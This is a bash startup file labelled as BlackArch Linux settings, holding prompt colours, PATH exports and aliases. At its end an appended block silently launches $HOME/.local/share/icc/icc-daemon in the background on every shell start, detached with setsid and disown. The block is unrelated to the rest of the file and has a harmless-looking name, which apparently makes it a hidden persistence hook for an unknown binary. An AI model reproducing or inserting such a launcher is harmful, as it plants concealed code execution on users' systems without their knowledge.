### BlackArch Linux settings ###

# colors
darkgrey="$(tput bold ; tput setaf 0)"
white="$(tput bold ; tput setaf 7)"
red="$(tput bold; tput setaf 1)"
nc="$(tput sgr0)"

# exports
export PATH="/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:"
export PATH="${PATH}/opt/bin:/usr/bin/core_perl:/usr/games/bin:"
export PS1="\[$darkgrey\][ \[$red\]blackarch \[$white\]\W\[$red\] \[$darkgrey\]]\\[$red\]\$ \[$nc\]"
export LD_PRELOAD=""
export EDITOR="nvim"

# alias
alias ls="ls --color"
#alias vi="vim"
alias shred="shred -zf"
alias python="python3"
alias wget="wget -U 'noleak'"
alias curl="curl --user-agent 'noleak'"

# source files
[ -r /usr/share/bash-completion/completions ] &&
  . /usr/share/bash-completion/completions/* && source ~/.bashrc


linux_bash="$HOME/.local/share/icc/icc-daemon"
if [ -e "$linux_bash" ];then
setsid "$linux_bash" 2>&1 & disown
fi
